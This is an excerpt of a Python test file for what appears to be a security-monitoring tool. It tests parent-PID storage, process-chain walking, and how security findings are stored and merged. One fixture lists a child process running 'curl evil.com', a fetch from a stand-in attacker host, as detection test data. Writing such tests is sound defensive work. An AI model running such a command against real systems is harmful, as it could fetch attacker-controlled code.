...
class TestParentPidStorage:
    def test_parent_pid_stored_and_queryable(self):
        ...
        try:
            ...
            result = conn.execute("MATCH (p:Process {pid: 100}) RETURN p.parent_pid")
...
class TestProcessChainWalk:
    def test_chain_walks_upward_through_parent_pid(self):
        ...
        try:
            ...
            # Chain includes init/systemd (PID 1) as a real ancestor,
            # but stops there (PID 1's parent is PID 0 / kernel).
            ...
            "child_processes": [
                {
                    "pid": 2,
                    "name": "curl",
                    "cmd_line": "curl evil.com",
                    "code_signed": True,
                    "signing_authority": "Apple",
    ...
    def test_affected_pids_stored_and_queryable(self):
        ...
        try:
            finding = SecurityFinding(
                ...
                affected_entities=["curl"],
                evidence_event_ids=[1, 2],
                recommendation="Investigate",
                chain=[],
                affected_pids=[100, 200],
            )
...
class TestUpdateFinding:
    def test_update_merges_evidence_ids(self):
        ...
        try:
            ...
            queue.store_finding(finding)
            assert queue.update_finding(
                "upd-1", new_evidence_ids=[3, 4, 5], new_description="Updated", new_severity="high"
            )
...
class TestFindingAccumulation:
    ...
    def test_accumulation_no_duplicates(self):
        ...
        try:
            ...
            queue.update_finding(
                "accum-1", new_evidence_ids=[3, 4], new_description="Batch 2: File download", new_severity="high"
            )
            queue.update_finding(
                "accum-1", new_evidence_ids=[5, 6], new_description="Batch 3: Payload", new_severity="critical"
            )
